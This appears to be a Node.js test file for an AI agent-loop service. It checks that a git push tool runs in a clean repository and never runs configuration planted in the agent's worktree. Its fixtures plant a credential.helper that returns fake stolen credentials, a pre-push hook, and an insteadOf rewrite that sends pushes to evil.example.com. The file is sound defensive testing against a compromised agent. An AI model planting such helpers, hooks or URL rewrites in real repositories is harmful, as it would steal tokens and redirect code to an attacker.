// REAL adversarial git test for send_git_push: the run worktree carries a malicious credential.helper,
// a core.hooksPath pre-push hook, and an insteadOf URL rewrite — the staged bundle→clean-repo push must
// never execute agent git code or leak the token to agent config. Uses real temp git repos + a fake token.
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { mkdtempSync, mkdirSync, writeFileSync, chmodSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import test from "node:test";
import { openControlStore } from "../src/control/store.mjs";
import { createLoopGithubTools } from "../src/loops/tools.mjs";

const WS_MODEL = { provider: "anthropic", model: "m" };

function env() {
  const store = openControlStore({ path: null });
  const project = store.projects.upsert({ repo: "hifizz/tars-sandbox-playground", defaultBranch: "main" });
  const { workspace } = store.workspaces.create({
    requestId: "ws-1", projectId: project.id, name: "w", baseBranch: "main", branch: "b",
    cwd: "/home/sprite/w", model: WS_MODEL,
  });
  const capabilities = { code: "readwrite", web: true, github: { openPr: true } };
  const loop = { id: "loop-1", workspaceId: workspace.id, capabilities };
  const run = store.loopRuns.enqueue({
    loopId: loop.id, loopVersion: 1, workspaceId: workspace.id,
    triggerKind: "github_issue", triggerKey: "gh:issue.opened:5",
    payload: { entity: { kind: "issue", number: 5 }, baseBranch: "main", repo: "hifizz/tars-sandbox-playground", capabilities },
    entityRef: "issue:5",
  }).run;
  const bot = { id: "bot-1", conversationId: "conv-1", loopRun: { loopId: loop.id, runId: run.id } };
  return { store, run, bot, workspace };
}

test("send_git_push runs entirely in a service-owned clean repo: agent credential.helper/hooks/insteadOf never execute", async () => {
  const e = env();
  const root = mkdtempSync(join(tmpdir(), "loop-push-"));
  const workDir = join(root, "worktree");
  try {
    // A real git worktree the "agent" has poisoned: malicious helper, pre-push hook, insteadOf rewrite.
    execFileSync("git", ["init", "-q", workDir]);
    execFileSync("git", ["-C", workDir, "config", "user.email", "a@b.c"]);
    execFileSync("git", ["-C", workDir, "config", "user.name", "a"]);
    // Agent's credential helper marks a sentinel file AND tries to return its own creds.
    execFileSync("git", ["-C", workDir, "config", "credential.helper",
      `!f() { touch ${join(root, "AGENT-HELPER-RAN")}; echo username=evil; echo password=stolen; }; f`]);
    // Agent's hook would fire on any `git push` run in this dir.
    const hooksDir = join(workDir, ".git", "hooks");
    mkdirSync(hooksDir, { recursive: true });
    const hook = join(hooksDir, "pre-push");
    writeFileSync(hook, `#!/bin/sh\ntouch ${join(root, "AGENT-HOOK-RAN")}\nexit 0\n`);
    chmodSync(hook, 0o755);
    // Agent's insteadOf redirect (would send the push to their host).
    execFileSync("git", ["-C", workDir, "config", `url.https://evil.example.com/.insteadOf`, "https://github.com/"]);
    // A real commit on the run's branch.
    writeFileSync(join(workDir, "f.txt"), "x");
    execFileSync("git", ["-C", workDir, "add", "f.txt"]);
    execFileSync("git", ["-C", workDir, "commit", "-qm", "x"]);
    execFileSync("git", ["-C", workDir, "branch", "loops/gh/run_real_id"]);
    e.store.loopRuns.update(e.run.id, { branch: "loops/gh/run_real_id" });
    e.bot.loopRun.dir = workDir;

    // The staged push commands, replayed by the test's runtimeBash in a REAL shell (offline, no network —
    // the actual `git push` to github.com never happens; we stop after proving agent config can't fire).
    const cmds = [];
    const callOptions = [];
    const deps = {
      loopRuns: e.store.loopRuns, loops: { get: () => e.store.loopRuns.get(e.run.id) },
      github: { createPull: async () => ({ number: 42 }) },
      botOfConversation: async () => e.bot,
      workspaceOf: () => e.workspace,
      record: () => {},
      runtimeBash: async () => Object.assign(async (cmd, options) => { cmds.push(cmd); callOptions.push(options); return { exitCode: 0, stdout: "", stderr: "" }; }, { supportsEnv: true }),
    };
    const ext = createLoopGithubTools(deps);
    await ext.tools.find((t) => t.name === "send_git_push").execute({}, { conversationId: "conv-1" }, {});

    const stagePath = /mkdir '([^']+)'/.exec(cmds[0])[1];
    const realCmds = cmds;
    const env = { ...process.env, GH_TOKEN: "fake-token-xyz" };
    for (const [index, c] of realCmds.entries()) {
      if (/ push '/.test(c) || c.startsWith("rm -rf")) continue;
      assert.equal(callOptions[index]?.env?.GH_TOKEN, "", "export/import must strip provider token");
      execFileSync("/bin/sh", ["-c", c], { env: { ...env, ...callOptions[index].env } });
    }
    const cleanDir = join(stagePath, "clean");
    const refs = execFileSync("git", ["-C", cleanDir, "show-ref"], { env }).toString();
    assert.match(refs, /refs\/heads\/loops\/gh\/run_real_id/, "the clean repo carries the run ref");
    assert.ok(!existsSync(join(root, "AGENT-HELPER-RAN")), "agent credential.helper did NOT execute");
    assert.ok(!existsSync(join(root, "AGENT-HOOK-RAN")), "agent pre-push hook did NOT fire");

    // The token-carrying push command targets the CLEAN repo (dir exists, agent config never copied).
    const pushCmd = realCmds.find((c) => / push '/.test(c));
    assert.ok(pushCmd.includes(`-C '${cleanDir}'`), "push runs in the clean repo");
    assert.ok(!pushCmd.includes(`-C '${workDir}'`), "token command never touches the agent worktree");
    // Simulate credential resolution in the CLEAN repo: agent helper is absent, server helper wins.
    const fill = execFileSync("/bin/sh", ["-c",
      `cd ${cleanDir} && GIT_CONFIG_NOSYSTEM=1 GIT_CONFIG_GLOBAL=/dev/null GIT_TERMINAL_PROMPT=0 GH_TOKEN=fake-token-xyz ` +
      `git -c 'credential.helper=' -c 'credential.helper=!f() { echo username=x-access-token; echo password=$GH_TOKEN; }; f' ` +
      `credential fill <<'IN'\nprotocol=https\nhost=github.com\nIN`], { env }).toString();
    assert.match(fill, /username=x-access-token/, "server helper supplies creds");
    assert.match(fill, /password=fake-token-xyz/, "token comes from env, not argv");
    assert.ok(!existsSync(join(root, "AGENT-HELPER-RAN")), "agent helper STILL not run for the token path");
    rmSync(stagePath, { recursive: true, force: true });
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

import { existsSync } from "node:fs";
